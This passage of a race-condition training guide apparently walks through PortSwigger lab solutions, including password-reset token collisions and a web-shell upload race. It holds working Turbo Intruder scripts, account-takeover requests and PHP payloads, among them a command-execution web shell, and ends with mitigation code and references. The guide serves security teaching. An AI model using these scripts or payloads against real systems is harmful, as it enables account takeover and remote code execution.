**Real Vulnerability:** Token generation and username storage occur in separate steps. Parallel requests can cause timestamp to be captured once but applied to multiple users.

#### Solution Steps

**Phase 1: Study the Behavior**

1. **Initiate password reset for your account:**
```http
POST /forgot-password HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]&username=wiener
```

2. **Examine email with reset link:**
```
https://[LAB-ID].web-security-academy.net/forgot-password?reset_token=a7f83d91fe...&username=wiener
```

3. **Send multiple sequential requests in Repeater**

4. **Observe token patterns:**
   - Consistent length (suggests hash function)
   - Different for each request
   - No obvious pattern without timing consideration

5. **Hypothesis:** Token may include timestamp as input

**Phase 2: Bypass Per-Session Locking**

PHP and similar frameworks lock one request per session to prevent race conditions. This must be bypassed to exploit the vulnerability.

1. **Obtain new session without cookie:**
```http
GET /forgot-password HTTP/2
Host: [LAB-ID].web-security-academy.net
```

Response includes:
```http
HTTP/2 200 OK
Set-Cookie: session=NewSessionCookie; HttpOnly
Content-Length: 3256

[HTML with CSRF token]
```

2. **Create two independent sessions:**
   - Session 1: Original session
   - Session 2: Newly obtained session

3. **Prepare requests with different sessions:**
```http
# Request 1: Original session
POST /forgot-password HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=OriginalSession
Content-Type: application/x-www-form-urlencoded

csrf=OriginalToken&username=wiener

# Request 2: New session
POST /forgot-password HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=NewSession
Content-Type: application/x-www-form-urlencoded

csrf=NewToken&username=wiener
```

4. **Send in parallel multiple times**

5. **Observe timing:** Processing times now "closely aligned, sometimes identical"

**Phase 3: Confirm the Vulnerability**

1. **Check inbox after parallel requests with identical timing**

2. **Compare tokens in confirmation emails:**
```
Email 1: reset_token=7b9f2e8a6d...
Email 2: reset_token=7b9f2e8a6d...  (IDENTICAL!)
```

3. **Conclusion:** Matching timestamps produce identical tokens

4. **Test cross-user exploitation:**
```http
# Request 1: Your account
POST /forgot-password HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=Session1
Content-Type: application/x-www-form-urlencoded

csrf=Token1&username=wiener

# Request 2: Target account
POST /forgot-password HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=Session2
Content-Type: application/x-www-form-urlencoded

csrf=Token2&username=carlos
```

5. **Send in parallel**

6. **Check inbox:** Should receive one email with token valid for both users

**Phase 4: Complete the Attack**

1. **Copy reset link from email:**
```
https://0a85003e041c3e9b80c8b9c700830078.web-security-academy.net/forgot-password?reset_token=7b9f2e8a6d5c3h1k9m0n4p2q8r6t5u7v&username=wiener
```

2. **Modify username parameter:**
```
https://0a85003e041c3e9b80c8b9c700830078.web-security-academy.net/forgot-password?reset_token=7b9f2e8a6d5c3h1k9m0n4p2q8r6t5u7v&username=carlos
```

3. **Visit modified URL** in browser

4. **Set new password:**
```http
POST /forgot-password HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

reset_token=7b9f2e8a6d5c3h1k9m0n4p2q8r6t5u7v&username=carlos&new_password=NewPass123!
```

5. **Log in as carlos:**
```http
POST /login HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos&password=NewPass123!
```

6. **Access admin panel and delete user:**
```http
GET /admin/delete?username=carlos HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[CARLOS-SESSION]
```

#### HTTP Request/Response Examples

**Obtaining New Session:**
```http
GET /forgot-password HTTP/2
Host: 0a85003e041c3e9b80c8b9c700830078.web-security-academy.net

HTTP/2 200 OK
Set-Cookie: session=kR3mL9jQ6wNxP2yB8zA5fT0gV7pDsXh1; Secure; HttpOnly; SameSite=None
Content-Type: text/html; charset=utf-8
Content-Length: 3256

<!DOCTYPE html>
<html>
    <body>
        <form method="POST" action="/forgot-password">
            <input name="csrf" value="x8KmL4pQ9rYvN2jFwZnC7sVbG1hT6dXk">
            <input name="username">
            <button type="submit">Reset password</button>
        </form>
    </body>
</html>
```

**Parallel Reset Requests:**
```http
# Request 1
POST /forgot-password HTTP/2
Host: 0a85003e041c3e9b80c8b9c700830078.web-security-academy.net
Cookie: session=OriginalSession123
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

csrf=x8KmL4pQ9rYvN2jFwZnC7sVbG1hT6dXk&username=wiener

# Request 2
POST /forgot-password HTTP/2
Host: 0a85003e041c3e9b80c8b9c700830078.web-security-academy.net
Cookie: session=kR3mL9jQ6wNxP2yB8zA5fT0gV7pDsXh1
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

csrf=a7KmL2pQ5rYvN9jFwZnC3sVbG8hT4dXk&username=carlos
```

**Confirmation Email:**
```
From: noreply@[LAB-ID].web-security-academy.net
To: wiener@exploit-[ID].exploit-server.net
Subject: Reset your password

Please click the following link to reset your password:

https://0a85003e041c3e9b80c8b9c700830078.web-security-academy.net/forgot-password?reset_token=7b9f2e8a6d5c3h1k9m0n4p2q8r6t5u7v&username=wiener

This link will expire in 30 minutes.
```

**Password Reset Submission:**
```http
POST /forgot-password HTTP/2
Host: 0a85003e041c3e9b80c8b9c700830078.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

reset_token=7b9f2e8a6d5c3h1k9m0n4p2q8r6t5u7v&username=carlos&new_password=Hacked123!&confirm_password=Hacked123!
```

#### Key Technical Details

- **Timestamp Collision:** Parallel processing at same millisecond produces identical hashes
- **Session Locking Bypass:** Using different sessions prevents mutual exclusion
- **Token Reusability:** Same token valid for any username parameter
- **Broken Cryptography:** Timestamp alone insufficient entropy source

#### Common Mistakes

- Using same session cookie (prevented by session locking)
- Not checking email for identical tokens
- Missing username parameter modification
- Attempting to use token before obtaining it
- Not waiting for token expiration between attempts

#### Troubleshooting

**Problem:** Tokens never match
**Solution:** Increase number of parallel attempts (try 50 requests)

**Problem:** Session locking prevents parallel execution
**Solution:** Verify using completely different session cookies

**Problem:** Can't login after password change
**Solution:** Retry race condition attack to get fresh token

**Problem:** Token expired error
**Solution:** Work quickly after receiving confirmation email

---

### Lab 7: Web Shell Upload via Race Condition

**Difficulty:** Practitioner
**Objective:** Upload and execute a PHP web shell by exploiting the race window between file upload and antivirus validation.

#### Understanding the Vulnerability

The file upload process follows these steps:
1. File received and temporarily stored
2. File moved to web-accessible directory
3. Antivirus scanning initiated
4. Malicious files deleted after scan completes

**Race Window:** Between steps 2 and 4, the file exists in an accessible location. If requests are sent to execute the file during this window, the code runs before deletion.

**Vulnerable Flow:**
```python
def upload_avatar(file):
    # Save to accessible directory
    filepath = f"/files/avatars/{file.filename}"
    file.save(filepath)

    # Queue antivirus scan (async)
    scan_result = antivirus_scan.delay(filepath)

    # Race window: file is accessible here!

    # Delete if malicious
    if scan_result == "malicious":
        os.remove(filepath)
```

#### Solution Steps

**Phase 1: Understand the Vulnerability**

1. **Login with credentials:** `wiener:peter`

2. **Test file upload functionality:**
```http
POST /my-account/avatar HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 428

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="test.jpg"
Content-Type: image/jpeg

[Binary image data]
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

[CSRF-TOKEN]
------WebKitFormBoundary--
```

3. **Observe upload response and file location:**
```http
HTTP/2 200 OK

The file avatars/test.jpg has been uploaded.
```

4. **Note accessible path:**
```
https://[LAB-ID].web-security-academy.net/files/avatars/test.jpg
```

**Phase 2: Create the Exploit Payload**

Create `exploit.php`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Payload Explanation:**
- `file_get_contents()` - Reads file contents
- `/home/carlos/secret` - Target file path (from lab description)
- `echo` - Outputs content in HTTP response

**Phase 3: Setup Burp Suite**

1. **Install Turbo Intruder** from BApp Store

2. **Capture upload request** with exploit.php:
```http
POST /my-account/avatar HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 512

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

[CSRF-TOKEN]
------WebKitFormBoundary--
```

3. **Capture GET request** for uploaded file:
```http
GET /files/avatars/exploit.php HTTP/2
Host: [LAB-ID].web-security-academy.net
```

**Phase 4: Configure Turbo Intruder Script**

**Python Script Template:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=100,
        pipeline=False
    )

    # POST request to upload PHP shell
    request1 = '''POST /my-account/avatar HTTP/2
Host: 0a2700f1034e21ba81a4e0210097008e.web-security-academy.net
Cookie: session=vK8mL3nQ9wTxJ6yB2zA5fR0gP7pDsXc1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 512

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="csrf"

x9KmL2pQ8rYvN5jFwZnC4sVbG7hT3dXk
------WebKitFormBoundary7MA4YWxkTrZu0gW--
'''

    # GET request to execute PHP shell
    request2 = '''GET /files/avatars/exploit.php HTTP/2
Host: 0a2700f1034e21ba81a4e0210097008e.web-security-academy.net
Cookie: session=vK8mL3nQ9wTxJ6yB2zA5fR0gP7pDsXc1

'''

    # Attack: Upload once, attempt execution 5 times
    engine.queue(request1, gate='race1')
    for i in range(5):
        engine.queue(request2, gate='race1')

    # Release all requests simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Script Explanation:**
- **High Concurrency:** 10 connections maximize race success
- **Upload First:** POST queued before GET requests
- **Multiple Attempts:** 5 GET requests to hit narrow window
- **Synchronized Release:** Gate ensures all sent together
- **Proper Termination:** `\r\n\r\n` ends each request

**Phase 5: Execute the Race Condition Attack**

1. **Launch Turbo Intruder** with configured script

2. **Observe results table:**
   - Most GET requests: 404 Not Found (file deleted)
   - Success: 200 OK with content

3. **Identify successful response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64

a7f9e6d4c2b8h5j3k1m9n0p6q4r8s2t7u5v3w1x9y7z5A3B1C9D7E5F3
```

4. **Submit the secret** to solve lab

#### HTTP Request/Response Examples

**Upload Request:**
```http
POST /my-account/avatar HTTP/2
Host: 0a2700f1034e21ba81a4e0210097008e.web-security-academy.net
Cookie: session=vK8mL3nQ9wTxJ6yB2zA5fR0gP7pDsXc1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 512

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="csrf"

x9KmL2pQ8rYvN5jFwZnC4sVbG7hT3dXk
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**Execution Request (During Race Window):**
```http
GET /files/avatars/exploit.php HTTP/2
Host: 0a2700f1034e21ba81a4e0210097008e.web-security-academy.net
Cookie: session=vK8mL3nQ9wTxJ6yB2zA5fR0gP7pDsXc1
```

**Success Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64

a7f9e6d4c2b8h5j3k1m9n0p6q4r8s2t7u5v3w1x9y7z5A3B1C9D7E5F3
```

**Failure Response (File Already Deleted):**
```http
HTTP/2 404 Not Found
Content-Type: text/html; charset=utf-8
Content-Length: 2847

<!DOCTYPE html>
<html>
    <body>
        <h1>Not Found</h1>
        <p>The requested file was not found on this server.</p>
    </body>
</html>
```

#### Key Technical Details

- **Antivirus Delay:** Scanning takes ~50-200ms, creating exploitable window
- **File Accessibility:** Files immediately accessible after upload
- **Async Deletion:** Removal only after scan completion
- **Multiple Attempts:** Required due to narrow timing window
- **Content-Type Bypass:** PHP execution not prevented during race window

#### Alternative Payloads

**Remote Command Execution:**
```php
<?php system($_GET['cmd']); ?>
```

**Directory Listing:**
```php
<?php echo implode("\n", scandir('/home/carlos')); ?>
```

**Environment Variables:**
```php
<?php phpinfo(); ?>
```

#### Common Mistakes

- Wrong file path in exploit code
- Missing session cookie in requests
- Incorrect boundary in multipart data
- Not enough GET attempts (increase to 10-20)
- Wrong Content-Type in upload

#### Troubleshooting

**Problem:** All GET requests return 404
**Solution:** Increase number of GET requests to 20

**Problem:** Upload rejected
**Solution:** Verify CSRF token and session cookie are valid

**Problem:** 200 response but no content
**Solution:** Check file path in PHP payload matches lab requirements

**Problem:** Turbo Intruder script errors
**Solution:** Ensure proper request termination with `\r\n\r\n`

---

## Attack Techniques

### 1. HTTP/2 Single-Packet Attack

**Concept:** Send multiple HTTP/2 requests in a single TCP packet to minimize network jitter and maximize race window exploitation.

**Implementation:**
```python
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=1,  # Single connection
    engine=Engine.BURP2       # HTTP/2 support
)
```

**Advantages:**
- All requests arrive simultaneously
- Eliminates network timing variance
- Maximizes collision probability
- Requires Burp Suite 2023.9+

**Requirements:**
- HTTP/2 support on target server
- Burp Suite Professional
- Single connection to target

### 2. Last-Byte Synchronization

**Concept:** For HTTP/1.1 servers, withhold the last byte of each request, then send all final bytes simultaneously.

**Implementation:**
```python
# In Turbo Intruder
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=10,
    engine=Engine.THREADED  # HTTP/1.1 mode
)

# Requests synchronized at last byte
for req in requests:
    engine.queue(req, gate='sync')

engine.openGate('sync')
```

**Advantages:**
- Works with HTTP/1.1
- Reduces network jitter
- Compatible with more servers

**Limitations:**
- Less precise than HTTP/2 single-packet
- Still subject to some network variance

### 3. Connection Warming

**Purpose:** Reduce latency variance by establishing and warming connections before race attack.

**Implementation:**
```python
# Add warmup requests before actual attack
warmupReq = '''GET / HTTP/2
Host: target.com

'''

# Send warmup
for i in range(5):
    engine.queue(warmupReq)

engine.start()
time.sleep(2)  # Wait for completion

# Now execute actual race attack
```

**Effect:**
- First request: ~850ms (cold)
- After warming: ~120ms (warm)
- Reduces timing unpredictability

### 4. Multi-Endpoint Alignment

**Challenge:** Different endpoints process at different speeds.

**Solution - Rate Limiting Abuse:**
```python
# Intentionally trigger rate limits on faster endpoint
# to slow it down and align with slower endpoint

for i in range(100):
    engine.queue(fastEndpointRequest)

time.sleep(1)

# Now both endpoints process at similar speeds
engine.queue(fastEndpointRequest, gate='race')
engine.queue(slowEndpointRequest, gate='race')
engine.openGate('race')
```

**Solution - Multiple Attempts:**
```python
# Try many combinations to hit timing window
for attempt in range(50):
    engine.queue(endpoint1, gate=str(attempt))
    engine.queue(endpoint2, gate=str(attempt))
    engine.openGate(str(attempt))
```

### 5. Session-Based Locking Bypass

**Problem:** Frameworks like PHP lock one request per session.

**Solution:**
```python
# Use different session tokens for each request
request1 = req.replace('session=ABC', 'session=ABC')
request2 = req.replace('session=ABC', 'session=XYZ')

engine.queue(request1, gate='race')
engine.queue(request2, gate='race')
engine.openGate('race')
```

**How to Obtain Multiple Sessions:**
1. Open multiple browsers
2. Use incognito/private windows
3. Request new sessions programmatically:
```http
GET /new-session HTTP/2
Host: target.com
```

### 6. Gate Mechanism for Synchronization

**Purpose:** Ensure requests are released simultaneously.

**Pattern:**
```python
# Queue requests with same gate
for i in range(20):
    engine.queue(request, gate='attack1')

# Release all at once
engine.openGate('attack1')
```

**Multiple Gates for Staged Attacks:**
```python
# Stage 1: Setup
engine.queue(setupReq, gate='stage1')
engine.openGate('stage1')

# Stage 2: Race condition
for i in range(10):
    engine.queue(raceReq, gate='stage2')
engine.openGate('stage2')
```

### 7. Sub-State Exploitation

**Partial Construction Example:**
```python
# Target the window between object creation and initialization
for attempt in range(20):
    # Create object
    engine.queue(createRequest, gate=str(attempt))

    # Try to use object before initialization completes
    for i in range(50):
        engine.queue(useRequest, gate=str(attempt))

    engine.openGate(str(attempt))
```

**Null Value Exploitation:**
```http
# Use array syntax to match null values
GET /api/verify?token[]= HTTP/2
Host: target.com

# PHP: null == [] evaluates to true
```

### 8. Time-Sensitive Collision

**Timestamp-Based Tokens:**
```python
# Send multiple requests to force same timestamp
for i in range(100):
    engine.queue(resetRequest, gate='time')

engine.openGate('time')

# Check for duplicate tokens
```

**JWT Timestamp Manipulation:**
```python
# Generate requests targeting specific timestamp
import time

current_time = int(time.time())
for i in range(20):
    token = generate_jwt(user, current_time)
    request = req.replace('TOKEN', token)
    engine.queue(request, gate='jwt')

engine.openGate('jwt')
```

---

## Burp Suite Workflows

### Burp Repeater - Basic Race Condition Testing

**Step 1: Capture and Send to Repeater**
```
1. Proxy → HTTP history → Find request
2. Right-click → Send to Repeater
```

**Step 2: Create Tab Group**
```
1. In Repeater tab → Right-click tab
2. Add to new tab group
3. Duplicate tab (Ctrl+Shift+D) 19 times
```

**Step 3: Configure Requests**
```
1. Ensure all tabs have same session cookie
2. Update CSRF tokens if needed
3. Modify parameters as required
```

**Step 4: Execute Attack**
```
1. Right-click tab group name
2. Send group in parallel (single-packet attack)
3. Analyze responses for anomalies
```

### Turbo Intruder - Advanced Attacks

**Installation:**
```
1. Extender → BApp Store
2. Search "Turbo Intruder"
3. Install
```

**Basic Usage:**
```
1. Right-click request → Extensions → Turbo Intruder
2. Mark payload positions with %s
3. Select template or write custom
4. Configure engine settings
5. Launch attack
```

**Template Selection:**
- `race-single-packet-attack.py` - HTTP/2 single-packet
- `race-last-byte-sync.py` - HTTP/1.1 synchronization
- `examples/default.py` - Custom scripting

**Custom Script Structure:**
```python
def queueRequests(target, wordlists):
    # Configure engine
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Queue requests
    for i in range(20):
        engine.queue(target.req, str(i), gate='race1')

    # Execute
    engine.openGate('race1')

def handleResponse(req, interesting):
    # Process responses
    table.add(req)
```

### Detection Workflow

**Phase 1: Identify Candidates**
```
1. Map application endpoints
2. Find operations that:
   - Check then use resources
   - Enforce limits
   - Consume single-use items
   - Update shared state
```

**Phase 2: Baseline Testing**
```
1. Send request twice sequentially
2. Document expected behavior
3. Note timing, responses, errors
```

**Phase 3: Race Testing**
```
1. Create 10-20 duplicate requests
2. Send in parallel
3. Compare with baseline
4. Look for:
   - Different status codes
   - Multiple successes
   - Timing anomalies
   - Different error messages
```

**Phase 4: Refinement**
```
1. Isolate minimal requests
2. Adjust timing/concurrency
3. Test different parameters
4. Confirm exploitability
```

### Response Analysis

**Look For:**

**Status Code Differences:**
```
Sequential: 200, 409, 409, 409 (expected)
Parallel:   200, 200, 200, 409 (vulnerable!)
```

**Response Length Variations:**
```
Sequential: All 3420 bytes
Parallel:   3420, 3567, 3567, 3420 (different!)
```

**Timing Patterns:**
```
Sequential: 150ms, 160ms, 155ms, 158ms
Parallel:   145ms, 145ms, 145ms, 145ms (synchronized!)
```

**Content Differences:**
```bash
# Sort responses by length
# Filter unique responses
# Diff response bodies
```

### Burp Collaborator Integration

**For Out-of-Band Detection:**
```python
# In Turbo Intruder
collaborator_domain = "abc123.burpcollaborator.net"

request_template = '''POST /api/process HTTP/2
Host: target.com

{"url": "http://REPLACE.burpcollaborator.net"}
'''

for i in range(20):
    subdomain = f"attempt{i}"
    req = request_template.replace('REPLACE', subdomain)
    engine.queue(req, gate='race')

engine.openGate('race')
```

**Check Collaborator:**
```
1. Burp → Collaborator client
2. Poll for interactions
3. Match subdomains to successful attempts
```

---

## Common Mistakes & Troubleshooting

### Mistake 1: Sequential Instead of Parallel Requests

**Problem:**
```python
# Wrong: This sends sequentially
for i in range(20):
    engine.queue(request)
    engine.start()  # Don't start inside loop!
```

**Solution:**
```python
# Correct: Queue all, then start
for i in range(20):
    engine.queue(request, gate='race1')

engine.openGate('race1')  # Start all at once
```

### Mistake 2: Different Session Cookies

**Problem:**
```http
# Request 1
Cookie: session=ABC123

# Request 2
Cookie: session=XYZ789

# Result: No collision (different users)
```

**Solution:**
```http
# Both requests must use SAME session
Cookie: session=ABC123
```

**Exception:** When bypassing session locking, intentionally use different sessions.

### Mistake 3: Stale CSRF Tokens

**Problem:**
```
All requests return: "Invalid CSRF token"
```

**Solution:**
```
1. Get fresh CSRF token
2. Update all requests in tab group
3. Work quickly before token expires
```

### Mistake 4: Insufficient Request Volume

**Problem:**
```
20 requests, no collision
```

**Solution:**
```python
# Increase to 50-100 requests for narrow windows
for i in range(100):
    engine.queue(request, gate='race')
```

### Mistake 5: Wrong Burp Version

**Problem:**
```
"Single-packet attack not available"
```

**Solution:**
```
1. Update to Burp Suite 2023.9 or higher
2. Update Turbo Intruder extension
3. Verify HTTP/2 support enabled
```

### Mistake 6: Missing Request Termination

**Problem:**
```python
request = '''POST /api HTTP/2
Host: target.com

data=value'''  # Missing final newlines!
```

**Solution:**
```python
request = '''POST /api HTTP/2
Host: target.com

data=value

'''  # Must end with \r\n\r\n or double newline
```

### Mistake 7: Ignoring Application State

**Problem:**
```
First attempt works, subsequent attempts fail
```

**Solution:**
```
1. Reset application state between attempts
2. Clear cart, logout, reset data
3. Use different test accounts
```

### Troubleshooting Guide

#### No Collision Detected

**Check:**
- [ ] Using parallel sending?
- [ ] Same session cookie?
- [ ] Valid CSRF tokens?
- [ ] HTTP/2 enabled?
- [ ] Enough requests (try 50)?
- [ ] Target actually vulnerable?

**Try:**
```python
# Increase concurrency
engine = RequestEngine(
    concurrentConnections=10,
    requestsPerConnection=100
)
```

#### Timing Issues

**Check:**
- [ ] Connection warming done?
- [ ] Network latency stable?
- [ ] Server under load?
- [ ] Using single-packet attack?

**Try:**
```python
# Add delays between attempts
for attempt in range(20):
    engine.queue(req, gate=str(attempt))
    engine.openGate(str(attempt))
    time.sleep(0.1)  # Small delay
```

#### Session Locking

**Check:**
- [ ] Framework uses session locking?
- [ ] Using same session for all requests?

**Try:**
```python
# Use different sessions
sessions = ['session1', 'session2', 'session3']
for i, session in enumerate(sessions):
    req = request.replace('session=OLD', f'session={session}')
    engine.queue(req, gate='race')

engine.openGate('race')
```

#### Rate Limiting

**Check:**
- [ ] Getting rate limit errors?
- [ ] IP-based limiting?
- [ ] Account-based limiting?

**Try:**
```python
# Slow down request rate
for i in range(20):
    engine.queue(req, gate=str(i))
    engine.openGate(str(i))
    time.sleep(1)  # Wait between attempts
```

#### Invalid Responses

**Check:**
- [ ] All requests malformed?
- [ ] Authentication issues?
- [ ] CSRF protection?

**Try:**
```
1. Verify single request works in Repeater
2. Check for special characters in payload
3. Verify Content-Length headers
4. Test with minimal request first
```

---

## Prevention & Defense

### Code-Level Mitigations

#### 1. Atomic Operations

**Vulnerable Code:**
```python
def apply_coupon(session_id, code):
    # Check
    if not is_used(code):
        # Race window!
        discount = get_discount(code)
        apply_discount(session_id, discount)
        mark_used(code)
```

**Secure Code:**
```python
def apply_coupon(session_id, code):
    # Atomic database transaction
    with db.transaction():
        # Check and update in single query
        result = db.execute("""
            UPDATE coupons
            SET used = true
            WHERE code = ? AND used = false
            RETURNING discount
        """, [code])

        if result:
            apply_discount(session_id, result.discount)
```

#### 2. Database Constraints

**Add Unique Constraints:**
```sql
CREATE TABLE coupon_usage (
    user_id INTEGER,
    coupon_code VARCHAR(50),
    used_at TIMESTAMP,
    UNIQUE(user_id, coupon_code)
);
```

**Use Database Transactions:**
```python
@db.transaction(isolation_level='SERIALIZABLE')
def transfer_funds(from_account, to_account, amount):
    # Database ensures serialization
    balance = get_balance(from_account)
    if balance >= amount:
        deduct(from_account, amount)
        add(to_account, amount)
```

#### 3. Pessimistic Locking

**Implementation:**
```python
def withdraw(account_id, amount):
    # Lock row for update
    with db.transaction():
        account = db.execute("""
            SELECT balance
            FROM accounts
            WHERE id = ?
            FOR UPDATE
        """, [account_id]).fetchone()

        if account.balance >= amount:
            db.execute("""
                UPDATE accounts
                SET balance = balance - ?
                WHERE id = ?
            """, [amount, account_id])
```

**Result:** Other transactions wait for lock release.

#### 4. Optimistic Locking

**Implementation:**
```python
def update_profile(user_id, new_email, version):
    result = db.execute("""
        UPDATE users
        SET email = ?, version = version + 1
        WHERE id = ? AND version = ?
    """, [new_email, user_id, version])

    if result.rowcount == 0:
        raise ConcurrencyError("Data was modified by another request")
```

**Advantage:** No locks needed; detects conflicts after the fact.

#### 5. Distributed Locks

**Using Redis:**
```python
def apply_discount(user_id, code):
    lock_key = f"coupon:{code}"

    # Acquire distributed lock
    lock = redis.lock(lock_key, timeout=5)

    if lock.acquire(blocking=True):
        try:
            if not is_used(code):
                apply_discount_logic(user_id, code)
                mark_used(code)
        finally:
            lock.release()
```

#### 6. Idempotency Keys

**Implementation:**
```python
def process_payment(payment_id, amount, idempotency_key):
    # Check if already processed
    existing = db.get_by_idempotency_key(idempotency_key)
    if existing:
        return existing  # Return cached result

    # Process payment
    result = charge_card(payment_id, amount)

    # Store with idempotency key
    db.store(result, idempotency_key)
    return result
```

**Client Usage:**
```http
POST /api/payment HTTP/2
Host: api.example.com
Idempotency-Key: a7f9e6d4-c2b8-h5j3-k1m9-n0p6q4r8s2t7

{"amount": 1000}
```

#### 7. Rate Limiting (Properly Implemented)

**Vulnerable:**
```python
def login(username, password):
    attempts = get_attempts(username)
    if attempts > 3:
        return "Too many attempts"

    # Race window here!
    if not verify(username, password):
        increment_attempts(username)
```

**Secure:**
```python
def login(username, password):
    # Atomic increment-and-check
    attempts = redis.incr(f"login_attempts:{username}")
    redis.expire(f"login_attempts:{username}", 3600)

    if attempts > 3:
        return "Too many attempts"

    if verify(username, password):
        redis.delete(f"login_attempts:{username}")
        return "Success"

    return "Invalid credentials"
```

### Architecture-Level Defenses

#### 1. Single-Threaded Processing

**For Critical Operations:**
```python
# Use message queue for serialization
def apply_coupon(session_id, code):
    # Add to queue instead of processing directly
    message_queue.send('coupon_queue', {
        'session_id': session_id,
        'code': code
    })

# Single worker processes queue
def coupon_worker():
    while True:
        msg = message_queue.receive('coupon_queue')
        process_coupon_application(msg)
```

#### 2. Event Sourcing

**Instead of Mutable State:**
```python
# Store events, not state
events = [
    {'type': 'COUPON_APPLIED', 'code': 'PROMO20', 'time': '2024-01-01T10:00:00'},
    {'type': 'COUPON_APPLIED', 'code': 'PROMO20', 'time': '2024-01-01T10:00:00'},
]

# Reconstruct state from events
def is_coupon_used(code):
    return any(e['type'] == 'COUPON_APPLIED' and e['code'] == code
               for e in events)
```

#### 3. Immutable Infrastructure

**Token Generation:**
```python
# Bad: Mutable state
user.reset_token = generate_token()

# Good: Immutable
reset_request = PasswordReset.create(
    user_id=user.id,
    token=generate_secure_token(),
    created_at=datetime.now(),
    expires_at=datetime.now() + timedelta(hours=1)
)
```

### Testing for Race Conditions

#### Static Analysis

**Tools:**
- Coverity - Detects concurrency issues
- ThreadSanitizer - Runtime race detection
- FindBugs - Java concurrency bugs

**Example Pattern Detection:**
```python
# Detect check-then-use patterns
if condition:  # Check
    # Gap here
    action()   # Use
```

#### Dynamic Testing

**Stress Testing:**
```python
import concurrent.futures

def stress_test():
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(apply_coupon, 'PROMO20')
                  for _ in range(100)]

        results = [f.result() for f in futures]

        # Should only succeed once
        assert results.count('success') == 1
```

#### Monitoring

**Detect Anomalies:**
```python
# Log all coupon applications
logger.info(f"Coupon {code} applied to session {session_id} at {time}")

# Alert on duplicates
if count_applications(code, time_window=1) > 1:
    alert("Possible race condition exploitation detected")
```

### Security Headers

**Prevent Parallel Requests:**
```http
# Limit connections per IP
Limit-Connections: 1

# Rate limiting headers
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 9
X-RateLimit-Reset: 1704067200
```

---

## References & Resources

### PortSwigger Resources

1. **Race Conditions Tutorial**
   - https://portswigger.net/web-security/race-conditions
   - Comprehensive guide with interactive examples

2. **Race Conditions Learning Path**
   - https://portswigger.net/web-security/learning-paths/race-conditions
   - Structured learning progression

3. **Research Papers**
   - "Smashing the state machine: The true potential of web race conditions" (Black Hat USA 2023)
   - https://portswigger.net/research/smashing-the-state-machine

4. **Burp Suite Documentation**
   - https://portswigger.net/burp/documentation
   - HTTP/2 single-packet attack documentation
   - Turbo Intruder extension guide

### OWASP Resources

5. **Business Logic Abuse - BLA9:2025**
   - https://owasp.org/www-project-top-10-for-business-logic-abuse/docs/the-top-10/race-condition-and-concurrency-issues
   - Race conditions in business logic context

6. **OWASP Top 10:2021 - Next Steps**
   - https://owasp.org/Top10/A11_2021-Next_Steps/
   - TOCTOU race conditions listed under code quality issues

7. **Session Management Cheat Sheet**
   - https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
   - Secure session handling guidance

### CWE/CVE Resources

8. **CWE-362: Race Condition**
   - https://cwe.mitre.org/data/definitions/362.html
   - Common Weakness Enumeration entry
   - Mitigations and examples

9. **CVE Examples:**
   - CVE-2024-6387: OpenSSH race condition RCE
   - CVE-2025-32463: sudo privilege escalation race condition
   - CVE-2023-29325: Windows OLE race condition

### Technical Articles

10. **How to Prevent Race Conditions in Web Applications**
